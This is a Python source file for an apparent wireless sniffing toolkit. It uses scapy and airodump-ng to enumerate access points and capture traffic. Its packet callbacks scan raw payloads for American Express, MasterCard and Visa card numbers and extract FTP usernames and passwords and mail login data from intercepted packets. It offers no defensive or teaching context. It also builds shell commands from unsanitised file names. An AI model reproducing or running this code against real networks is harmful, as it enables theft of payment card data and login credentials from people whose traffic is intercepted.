from scapy.all import *
import AirDumpParser

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green
O = '\033[33m' # orange
B = '\033[34m' # blue
P = '\033[35m' # purple
C = '\033[36m' # cyan
T = '\033[93m' # tan
ast = '['+B+'*'+W+'] '
min = '['+R+'-'+W+'] '
plu = '['+G+'+'+W+'] '

ap_list = []

def ssidSniffer(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
                ap_list.append(pkt.addr2)
                print "AP MAC: %s with SSID: %s " % (pkt.addr2, pkt.info)


def Airdump(interface, filename):
    cmd = 'airodump-ng -w '+filename+' --output-format csv '+interface
    try:
        subprocess.check_output(cmd, shell=True)
    except KeyboardInterrupt:
        print B+'[INFO]'+W+' Stop Dumping'
        pass

    print B+'[INFO]'+W+' Analyzing results file'
    cmd = 'ls -t | grep '+filename+'| head -n 1'
    file_result = subprocess.check_output(cmd, shell=True)
    file_result = file_result.rstrip()
    time.sleep(1)  # take time before re-open output file
    try:
        AirDumpParser.csvParser(file_result)
    except KeyboardInterrupt:
        print(R+'[INFO]'+W+' Exiting to main menu')

    return True


def sendibleDataSniff(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall('3[47][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if americaRE:
        print G+'[INFO]'+W+' Found American Express Card: ' + americaRE[0]
    if masterRE:
        print G+'[INFO]'+W+' Found MasterCard Card: ' + masterRE[0]
    if visaRE:
        print G+'[INFO]'+W+' Found Visa Card: ' + visaRE[0]


def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)

    if user:
        print G+'[INFO]'+W+' Detected FTP Login to ' + str(dest)
        print G+'[INFO]'+W+' User account: ' + str(user[0])
    elif pswd:
        print G+'[INFO]'+W+' Password: ' + str(pswd[0])


def mailSniff(pkt):
    # check to make sure it has a data payload
    if pkt[TCP].payload:
        mailpkt = str(pkt[TCP].payload)
        if 'user' in mailpkt.lower() or 'pass' in mailpkt.lower():
            print G+'[INFO]'+W+' Server: %s' % pkt[IP].dst
            print G+'[INFO]'+W+' Mail: %s' %pkt[TCP].payload